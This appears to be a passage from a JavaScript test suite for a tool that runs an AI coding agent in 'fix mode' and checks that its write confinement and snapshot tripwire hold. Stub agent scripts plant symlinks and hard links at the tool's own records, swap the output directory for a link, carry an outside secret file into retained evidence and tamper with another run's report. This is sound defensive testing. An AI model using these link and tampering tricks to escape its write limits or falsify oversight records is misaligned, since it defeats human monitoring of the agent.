      assert(!/CONFINEMENT FAILURE/.test(g.res.stderr), `fix scope: an out-of-tree --allow-write dir must be permitted:\n${g.res.stderr}`);
      const diffG = JSON.parse(readFileSync(join(g.outDir, 'iter-1-diff.json'), 'utf8'));
      assert(
        diffG.changed.added.some((p) => p.endsWith('bundle.js')),
        `fix scope: an out-of-tree --allow-write dir must be walked, got ${JSON.stringify(diffG.changed.added)}`,
      );
      assert(diffG.escapedOutsideScope.length === 0, `fix scope: an allowed root must not be an escape: ${JSON.stringify(diffG.escapedOutsideScope)}`);
    } finally {
      rmSync(allowTarget, { recursive: true, force: true });
    }

    // E: --allow-write must NOT widen the refusal for anything else.
    const e = drive({
      outName: 'edge-build-escape',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${outside}`,
    });
    assert(/CONFINEMENT FAILURE/.test(e.res.stderr), `fix scope: --allow-write must not disable the refusal for other paths:\n${e.res.stderr}`);
    const escE = JSON.parse(readFileSync(join(e.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      !escE.escapedOutsideScope.some((p) => p.endsWith(join('dist', 'bundle.js'))),
      'fix scope: an allowed root must not be reported as an escape',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// web-uplift-uruy: fix mode writes its OWN records into the tree the agent can write, after the
// agent exits. A link left at one of those names redirects the record onto a file outside the run
// tree, with this tool's privileges, and the run then reports success - the same defect class as
// web-uplift-rsbb (runner/safe-write.mjs), which is why this test drives the CALL SITES rather
// than the shared guard: the guard was already correct, the fixer simply did not use it.
//
// Measured on the pre-fix tree with the symlink case below: victim truncated, exit 0, `PASS:`
// printed. Only the victim-unchanged assertion catches that, so it is asserted first in each case.
export function testFixModeRefusesPlantedLinksInItsOwnRecords() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fix-links-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');
    // A clean report, so the climb PASSES: without it every scenario fails for the ordinary
    // reason (no usable report) and the exit code proves nothing about the planted link.
    const passReport = join(repoRoot, 'examples', 'playground-report-fixed.json');

    const drive = (outName, agentBody) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${agentBody}\n`);
      chmodSync(bin, 0o755);
      const res = run(
        process.execPath,
        [
          join(repoRoot, 'fixer', 'fix.mjs'),
          '--target', 'src',
          '--audit-url', 'http://example.test/',
          '--agent', 'claude',
          '--max-iterations', '1',
          '--findings', findings,
          '--isolation', 'host-permission-model',
          '--out', outName,
          '--reports-root', `reports-${outName}`,
        ],
        { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
      );
      return { res, outDir: join(root, outName) };
    };
    const output = (r) => `${r.res.stdout}\n${r.res.stderr}`;
    const passCrawl = (outName) =>
      `cp ${JSON.stringify(passReport)} ${JSON.stringify(join(root, outName, 'report.json'))}`;

    // 1. A SYMLINK at the first record the fixer writes after the agent exits. The record
    //    (iter-N-diff.json) is the fixer's own account of what the iteration changed.
    const victimLink = join(root, 'victim-link.txt');
    const sentinel = 'SENTINEL-LINK-TARGET\n';
    writeFileSync(victimLink, sentinel);
    const a = drive('out-link', [
      passCrawl('out-link'),
      `rm -f ${JSON.stringify(join(root, 'out-link', 'iter-1-diff.json'))}`,
      `ln -s ${JSON.stringify(victimLink)} ${JSON.stringify(join(root, 'out-link', 'iter-1-diff.json'))}`,
    ].join('\n'));
    assert.equal(readFileSync(victimLink, 'utf8'), sentinel, `fix records: the symlinked victim must be UNCHANGED:\n${output(a)}`);
    assert(a.res.status !== 0, `fix records: a planted symlink at a record this tool writes must FAIL the run, got ${a.res.status}:\n${output(a)}`);
    assert.match(output(a), /refusing to write .*iter-1-diff\.json/, `fix records: the refusal must name the record:\n${output(a)}`);
    assert.match(output(a), /symbolic link/, `fix records: the refusal must say it is a symbolic link:\n${output(a)}`);
    assert.doesNotMatch(a.res.stdout, /^PASS:/m, `fix records: a refused record write must never be reported as a pass:\n${output(a)}`);

    // 2. A HARD LINK at the same name. No symlink is followed here - the planted name IS the
    //    victim's inode - which is the second-round bypass web-uplift-rsbb's review found, so it
    //    is asserted on its own: a symlink-only guard passes case 1 and fails this one.
    const victimHard = join(root, 'victim-hard.txt');
    writeFileSync(victimHard, sentinel);
    const b = drive('out-hard', [
      passCrawl('out-hard'),
      `ln ${JSON.stringify(victimHard)} ${JSON.stringify(join(root, 'out-hard', 'iter-1-diff.json'))}`,
    ].join('\n'));
    assert.equal(readFileSync(victimHard, 'utf8'), sentinel, `fix records: the hard-linked victim must be UNCHANGED:\n${output(b)}`);
    assert(b.res.status !== 0, `fix records: a planted hard link must FAIL the run, got ${b.res.status}:\n${output(b)}`);
    assert.match(output(b), /refusing to write .*iter-1-diff\.json/, `fix records: the refusal must name the record:\n${output(b)}`);
    assert.match(output(b), /hard link/, `fix records: the refusal must say it is a hard link:\n${output(b)}`);
    assert.doesNotMatch(b.res.stdout, /^PASS:/m, `fix records: a refused record write must never be reported as a pass:\n${output(b)}`);

    // 3. The DIRECTORY level, which no leaf guard covers: the agent replaces the whole --out tree
    //    with a symlink to somewhere else, so every later record's path leaves the tree it belongs
    //    to. This is the "a write that would land outside --out is refused" arm, and the assertion
    //    that matters is that the victim DIRECTORY receives nothing.
    const victimDir = join(root, 'victim-dir');
    mkdirSync(victimDir, { recursive: true });
    writeFileSync(join(victimDir, 'keep.txt'), 'KEEP\n');
    const c = drive('out-swap', [
      `rm -rf ${JSON.stringify(join(root, 'out-swap'))}`,
      `ln -s ${JSON.stringify(victimDir)} ${JSON.stringify(join(root, 'out-swap'))}`,
    ].join('\n'));
    assert.equal(readFileSync(join(victimDir, 'keep.txt'), 'utf8'), 'KEEP\n', 'fix records: the swapped-in victim directory must be untouched');
    assert(
      !existsSync(join(victimDir, 'iter-1-diff.json')),
      `fix records: a record must not be written through a directory-level link:\n${readdirSync(victimDir).join(', ')}`,
    );
    assert(c.res.status !== 0, `fix records: a swapped --out tree must FAIL the run, got ${c.res.status}:\n${output(c)}`);
    assert.match(
      output(c),
      /refusing to write .*iter-1-diff\.json/,
      `fix records: the refusal must name the record whose tree left --out:\n${output(c)}`,
    );
    assert.doesNotMatch(c.res.stdout, /^PASS:/m, `fix records: a swapped tree must never be reported as a pass:\n${output(c)}`);

    // 4. Positive control: with no link planted, the SAME drive writes the record and reports the
    //    pass. Without this, a guard that refused every write would satisfy cases 1-3.
    const d = drive('out-clean', passCrawl('out-clean'));
    assert(d.res.status === 0, `fix records: an untouched run must still pass (got ${d.res.status})\n${output(d)}`);
    assert(/^PASS:/m.test(d.res.stdout), `fix records: an untouched run must report PASS:\n${d.res.stdout}`);
    const cleanDiff = join(d.outDir, 'iter-1-diff.json');
    assert(existsSync(cleanDiff), 'fix records: the per-iteration diff must still be written on a clean run');
    assert(statSync(cleanDiff).isFile(), 'fix records: the per-iteration diff must be a regular file');
    assert(statSync(cleanDiff).nlink === 1, 'fix records: the per-iteration diff must not be a link to another name');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// web-uplift-7692: the snapshot must cover the tree the agent is told to write into. With the
// DEFAULT --out (`reports/fix-<slug>`) it did not: snapshotTree drops any path with a `reports`
// segment, so an agent write there was in neither snapshot and the per-iteration diff reported no
// file changes - invisible and unreverted, which breaks the property the snapshot exists for.
//
// NOT asserted, because it is not true and this change does not make it true: reversion. Fix mode
// has no undo (fixer/fix.mjs says exactly that where it refuses an escape: "The changes are NOT
// reverted automatically"), so the contract is record-and-refuse, not record-and-roll-back. Stated
// here so the missing half of the acceptance wording is a decision on record, not an omission.
//
// The scope this DOES cover is this run's own --out tree. Other hosts' retained runs under the
// same `reports/` root stay excluded on purpose (previous runs' output, not this run's writes).
// web-uplift-qxhv: the COPY-IN direction. `cp(src, dest, {recursive:true})` copies symlinks VERBATIM, so a link
// the agent planted in its own scratch tree arrived in the RETAINED tree as a link - nothing followed it at copy
// time, and every later consumer (scorecard, compare, review, publication) reads through it later. A hard link is
// the same laundering by another name (web-uplift-rsbb: they come in pairs). Both must be refused, and the run
// must say so rather than quietly dropping evidence.
export function testFixModeSnapshotRefusesPlantedLinks() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fix-snapshot-links-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(join(root, 'outside'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');
    const passReport = join(repoRoot, 'examples', 'playground-report-fixed.json');
    const outDir = join(root, 'reports', 'fix-example.test');
    const outsideFile = join(root, 'outside', 'victim.png');
    const evidence = join(outDir, 'evidence');

    // The outside file is written BEFORE the run: an agent that creates it is (correctly) refused by the
    // confinement tripwire, which would test a different guard than the one this case is about.
    writeFileSync(outsideFile, 'OUTSIDE-SECRET');
    writeFileSync(join(binDir, 'claude'), [
      '#!/bin/sh',
      `mkdir -p ${JSON.stringify(evidence)}`,
      `printf 'REAL-EVIDENCE' > ${JSON.stringify(join(evidence, 'real.png'))}`,
      `ln -s ${JSON.stringify(outsideFile)} ${JSON.stringify(join(evidence, 'leak.png'))}`,
      `ln ${JSON.stringify(outsideFile)} ${JSON.stringify(join(evidence, 'hard.png'))}`,
      // web-uplift-cn13: report.md is a single FILE named by the run, so the evidence-tree walk never reached it
      // and the old copy dereferenced this link.
      `ln -s ${JSON.stringify(outsideFile)} ${JSON.stringify(join(outDir, 'report.md'))}`,
      `cp ${JSON.stringify(passReport)} ${JSON.stringify(join(outDir, 'report.json'))}`,
      'exit 0',
      '',
    ].join('\n'));
    chmodSync(join(binDir, 'claude'), 0o755);

    const res = run(process.execPath, [
      join(repoRoot, 'fixer', 'fix.mjs'),
      '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
      '--max-iterations', '1', '--findings', findings,
      '--isolation', 'host-permission-model',
      '--reports-root', 'retained',
    ], { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
    const output = `${res.stdout}\n${res.stderr}`;

    // The fixture must actually have planted what it claims, or the assertions below are vacuous.
    assert(lstatSync(join(evidence, 'leak.png')).isSymbolicLink(), `snapshot links: the fixture must plant a symlink:\n${output}`);
    assert(lstatSync(join(evidence, 'hard.png')).nlink > 1, `snapshot links: the fixture must plant a hard link:\n${output}`);

    // Walk the retained tree: no link may survive the copy-in, and the positive control must be there.
    const retained = join(root, 'retained');
    assert(existsSync(retained), `snapshot links: the run must be retained:\n${output}`);
    const found = [];
    const walk = (dir) => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const abs = join(dir, entry.name);
        const st = lstatSync(abs);
        // `latest` is run-history's own pointer, which is a symlink by design and is verified to stay inside
        // the run root by testLatestPointerCannotEscapeTheRunRoot. This case is about links that came from the
        // AGENT's tree, so the pointer is not evidence of laundering.
        if (st.isSymbolicLink() && entry.name !== 'latest') found.push({ name: entry.name, kind: 'symlink' });
        else if (st.isSymbolicLink()) continue;
        else if (st.isDirectory()) walk(abs);
        else found.push({ name: entry.name, kind: st.nlink > 1 ? 'hardlink' : 'file' });
      }
    };
    walk(retained);

    assert(!found.some((f) => f.kind === 'symlink'), `snapshot links: no symlink may be laundered into the retained tree, found ${JSON.stringify(found.filter((f) => f.kind === 'symlink'))}`);
    assert(!found.some((f) => f.name === 'leak.png'), `snapshot links: a planted symlink must not be copied, found ${JSON.stringify(found.map((f) => f.name))}`);
    assert(!found.some((f) => f.name === 'hard.png'), `snapshot links: a planted hard link must not be copied, found ${JSON.stringify(found.map((f) => f.name))}`);
    assert(found.some((f) => f.name === 'real.png'), `snapshot links: the run's own evidence must still be retained, found ${JSON.stringify(found.map((f) => f.name))}`);

    // web-uplift-cn13: the report.md SYMLINK must not be dereferenced into the retained run. The fixture planted it
    // pointing at the outside file, so its bytes arriving in the retained tree would mean the copy followed it.
    assert(
      !found.some((f) => f.name === 'report.md'),
      `snapshot links: a symlinked report.md must not be copied into the retained run, found ${JSON.stringify(found.map((f) => f.name))}`,
    );

    // And the refusal is VISIBLE in the retained report, so a reviewer sees a planted link rather than an empty dir.
    const retainedReport = found.find((f) => f.name === 'report.json');
    assert(retainedReport !== undefined, 'snapshot links: the retained run must carry its report.json');
    const walkForReport = (dir) => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const abs = join(dir, entry.name);
        if (entry.isDirectory()) {
          const r = walkForReport(abs);
          if (r) return r;
        } else if (entry.name === 'report.json') {
          return abs;
        }
      }
      return null;
    };
    const text = readFileSync(walkForReport(retained), 'utf8');
    assert(/symbolic link/.test(text), `snapshot links: the report must record the refused symlink, got ${text.slice(0, 400)}`);
    assert(/hard link/.test(text), `snapshot links: the report must record the refused hard link, got ${text.slice(0, 400)}`);
    assert(/"report\.md"/.test(text) || /report\.md/.test(text), 'snapshot links: the report must record the refused report.md too');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-9tah: the snapshot forced only THIS run's --out into the walk, so an agent write into another
// host's retained run under the same reports/ root was neither recorded nor refused - a previous run's records
// could be edited by a later run and the tripwire would say nothing. The property the snapshot exists to provide
// is "a change is recorded or it did not happen", which has no exception for a directory the agent can reach.
export function testFixModeRefusesWritesIntoAnotherHostsRetainedRun() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fix-otherhost-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');
    const passReport = join(repoRoot, 'examples', 'playground-report-fixed.json');
    const outDir = join(root, 'reports', 'fix-example.test');
    // A PREVIOUS run of a DIFFERENT host, sitting under the same reports root.
    // The exclusion is a NAME ('reports' in EXCLUDE_SEGMENTS), so this fixture must use it: a reports root called
    // 'retained' is walked anyway and the case would pass without the fix.
    const otherHostRun = join(root, 'reports', 'other-host.example', '20260101-000000-aaa');
    mkdirSync(otherHostRun, { recursive: true });
    writeFileSync(join(otherHostRun, 'report.json'), '{"previous": true}\n');

    writeFileSync(join(binDir, 'claude'), [
      '#!/bin/sh',
      `mkdir -p ${JSON.stringify(outDir)}`,
      `cp ${JSON.stringify(passReport)} ${JSON.stringify(join(outDir, 'report.json'))}`,
      // The write under test: this run edits ANOTHER host's retained record.
      `printf 'TAMPERED' > ${JSON.stringify(join(otherHostRun, 'report.json'))}`,
      'exit 0',
      '',
    ].join('\n'));
    chmodSync(join(binDir, 'claude'), 0o755);

    const res = run(process.execPath, [
      join(repoRoot, 'fixer', 'fix.mjs'),
      '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
      '--max-iterations', '1', '--findings', findings,
      '--isolation', 'host-permission-model',
      '--reports-root', 'reports',
    ], { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
    const output = `${res.stdout}\n${res.stderr}`;
    // The fixture must have written its own report first, or the refusal assertions could be vacuous.
    assert(existsSync(join(outDir, 'report.json')), `other-host: the fixture must write its own report first:\n${output}`);

    assert(res.status !== 0, `other-host: a write into another host's retained run must refuse the run, got ${res.status}:\n${output}`);
    assert(
      /other-host\.example/.test(output) && /CONFINEMENT FAILURE/.test(output),
      `other-host: the refusal must NAME the previous run's path, not merely fail:\n${output}`,
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

export function testFixModeSnapshotRecordsWritesUnderDefaultReportsOut() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fix-defaultout-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');
    const passReport = join(repoRoot, 'examples', 'playground-report-fixed.json');
    // The DEFAULT --out for http://example.test/ is reports/fix-example.test (slugify keeps `.`).
    const outDir = join(root, 'reports', 'fix-example.test');
    const planted = join(outDir, 'scratch', 'planted.txt');

    writeFileSync(join(binDir, 'claude'), [
      '#!/bin/sh',
      `mkdir -p ${JSON.stringify(join(outDir, 'scratch'))}`,
      `printf 'planted' > ${JSON.stringify(planted)}`,
      `cp ${JSON.stringify(passReport)} ${JSON.stringify(join(outDir, 'report.json'))}`,
      'exit 0',
      '',
    ].join('\n'));
    chmodSync(join(binDir, 'claude'), 0o755);

    const res = run(process.execPath, [
      join(repoRoot, 'fixer', 'fix.mjs'),
      '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
      '--max-iterations', '1', '--findings', findings,
      '--isolation', 'host-permission-model',
      // NO --out on purpose: the default reports/ path is the case under test.
      '--reports-root', 'retained',
    ], { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
    const output = `${res.stdout}\n${res.stderr}`;

    assert(existsSync(planted), `snapshot scope: the fixture must have written into the default --out:\n${output}`);
    const diffPath = join(outDir, 'iter-1-diff.json');
    assert(existsSync(diffPath), `snapshot scope: the per-iteration diff must be written:\n${output}`);
    const diff = JSON.parse(readFileSync(diffPath, 'utf8'));
    assert(
      diff.changed.added.some((p) => p.endsWith(join('scratch', 'planted.txt'))),
      `snapshot scope: a write under the DEFAULT --out must be RECORDED in the per-iteration diff, got ${JSON.stringify(diff.changed)}`,
    );
    assert(
      diff.changed.added.some((p) => p.endsWith('report.json')),
      `snapshot scope: the report the agent wrote into --out must be recorded too, got ${JSON.stringify(diff.changed)}`,
    );
    assert.deepEqual(
      diff.escapedOutsideScope,
      [],
      `snapshot scope: --out is a declared allowed root, so its own writes are recorded but not escapes: ${JSON.stringify(diff.escapedOutsideScope)}`,
    );
    // The positive half: covering --out must not turn a legitimate run into a refusal. Before this
    // change the run passed while silently ignoring the write, so both halves are asserted.
    assert(res.status === 0, `snapshot scope: a clean default-out run must still pass, got ${res.status}:\n${output}`);
    assert(/^PASS:/m.test(res.stdout), `snapshot scope: the climb must still report PASS:\n${res.stdout}`);
    assert(!/CONFINEMENT FAILURE/.test(res.stderr), `snapshot scope: an in-scope --out write must not be an escape:\n${res.stderr}`);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// web-uplift-arp, minimal design: this tool does NOT sandbox the agent. It refuses
// to spawn a write-capable agent unless the operator asserts which boundary they are
// providing, it says loudly that it cannot verify that assertion, it records the
// assertion as unverified, and the snapshot/diff tripwire stays as defence in depth.
export function testFixIsolationAssertion() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-isolation-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const agentMarker = join(root, 'agent-ran.txt');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, `#!/bin/sh\nprintf ran > ${JSON.stringify(agentMarker)}\nprintf x > ${JSON.stringify(join(root, 'escape.txt'))}\n`);
    chmodSync(bin, 0o755);
    const env = { ...process.env, PATH: `${binDir}:${process.env.PATH}` };
    const drive = (extra) => run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', 'src', '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--out', extra.out, '--reports-root', extra.reports, '--max-iterations', '1', ...(extra.args ?? [])],
      { cwd: root, env },
    );

    // Default: refuse BEFORE any agent spawn, and record the refusal.
    const refused = drive({ out: 'out-refused', reports: 'reports-refused' });
    assert(refused.status !== 0, `isolation: no assertion must refuse (exit ${refused.status})`);
    assert(/REFUSED/.test(refused.stderr) && /NO AGENT WAS STARTED/.test(refused.stderr), `isolation: the refusal must say no agent was started:\n${refused.stderr}`);
    assert(/--isolation/.test(refused.stderr), 'isolation: the refusal must name what is required');
    assert(!existsSync(agentMarker), 'isolation: the agent must NOT have been spawned');
    const refusedRecord = JSON.parse(readFileSync(join(root, 'out-refused', 'run-security.json'), 'utf8'));
    assert(refusedRecord.isolation === 'refused', `isolation: the refusal must be recorded (${refusedRecord.isolation})`);
    assert(!existsSync(join(root, 'reports-refused')), 'isolation: a refused run must leave the report history untouched');
    assert(!existsSync(join(root, 'escape.txt')), 'isolation: a refused run must not have run anything that could write');

    // With the assertion: allowed, but loud and recorded as UNVERIFIED.
    const asserted = drive({ out: 'out-asserted', reports: 'reports-asserted', args: ['--isolation', 'host-permission-model'] });
    assert(existsSync(agentMarker), 'isolation: an explicit assertion must allow the run to spawn the agent');
    assert(/WARNING/.test(asserted.stderr) && /UNVERIFIED/.test(asserted.stderr), `isolation: the warning must say the boundary is unverified:\n${asserted.stderr}`);
    const record = JSON.parse(readFileSync(join(root, 'out-asserted', 'run-security.json'), 'utf8'));
    assert(record.isolation === 'operator-supplied:host-permission-model', `isolation: the record must name the asserted mechanism (${record.isolation})`);
    assert(record.unverified === true, 'isolation: the record must mark the assertion unverified');
    assert(!/verified by this tool|guaranteed/i.test(asserted.stderr), 'isolation: the warning must not claim the tool verified anything');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// The positive path that matters now: with an assertion given, a legitimate fix runs,
// edits --target, reaches zero outstanding issues and publishes its result.
export function testFixIsolatedRunPublishes() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-iso-run-'));
  try {
    const binDir = join(root, 'bin');
    const fixture = join(root, 'site');
    mkdirSync(binDir, { recursive: true });
    mkdirSync(fixture, { recursive: true });
    writeFileSync(join(fixture, 'index.html'), '<h1>before</h1>');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, [
      '#!/bin/sh',
      `printf '<h1>after</h1>' > ${JSON.stringify(join(fixture, 'index.html'))}`,
      `cp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'out', 'report.json'))}`,
      'echo \'{"agent":"stub"}\'',
    ].join('\n') + '\n');
    chmodSync(bin, 0o755);
    const res = run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', fixture, '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--isolation', 'vm', '--out', join(root, 'out'), '--reports-root', join(root, 'reports'), '--max-iterations', '1'],
      { cwd: repoRoot, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
    );
    assert(/after/.test(readFileSync(join(fixture, 'index.html'), 'utf8')), 'isolation run: the agent edited --target');
    assert(res.status === 0, `isolation run: a legitimate fix must exit 0 (got ${res.status})\n${res.stdout}${res.stderr}`);
    assert(/^PASS:/m.test(res.stdout ?? ''), `isolation run: the fix must report PASS:\n${res.stdout}`);
    const host = readdirSync(join(root, 'reports'))[0];
    const entries = readdirSync(join(root, 'reports', host));
    assert(entries.some((e) => e.endsWith('-after')), `isolation run: the after run must be published (${JSON.stringify(entries)})`);
    assert(existsSync(join(root, 'reports', host, 'latest')), 'isolation run: latest must be published');
    assert(
      existsSync(join(root, 'reports', host, readlinkSync(join(root, 'reports', host, 'latest')), 'run-security.json')),
      'isolation run: the isolation record must travel into the retained result',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


export const fixModeTests = [
  testFixSurvivesUnscoreableReports,
  testFixRefusesPassOnIncompleteCoverage,
  testFixRefusesContradictoryCoverageClaim,
  testFixRejectsMalformedReports,
  testFixWriteScopeDiffing,
  testFixModeRefusesOutOfScopeWrites,
  testFixModeScopeEdgeCases,
  testFixModeRefusesPlantedLinksInItsOwnRecords,
  testFixModeSnapshotRefusesPlantedLinks,
  testFixModeRefusesWritesIntoAnotherHostsRetainedRun,
  testFixModeSnapshotRecordsWritesUnderDefaultReportsOut,
  testFixIsolationAssertion,
  testFixIsolatedRunPublishes,
];

await runSuite(fixModeTests, import.meta.url, { timeoutMs: 180000, concurrency: 1 });
